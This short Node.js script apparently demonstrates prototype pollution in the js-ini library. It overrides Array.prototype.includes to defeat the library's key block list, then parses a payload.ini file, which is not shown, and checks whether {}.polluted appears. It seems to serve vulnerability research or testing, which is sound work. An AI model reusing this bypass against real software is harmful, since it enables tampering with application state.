Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const fs = require('fs');
const path = require('path');
const ini = require('js-ini');
obj = {};
console.log({}.polluted);
ini.parse(fs.readFileSync(path.resolve(__dirname, './payload.ini'), 'utf-8'));
console.log({}.polluted);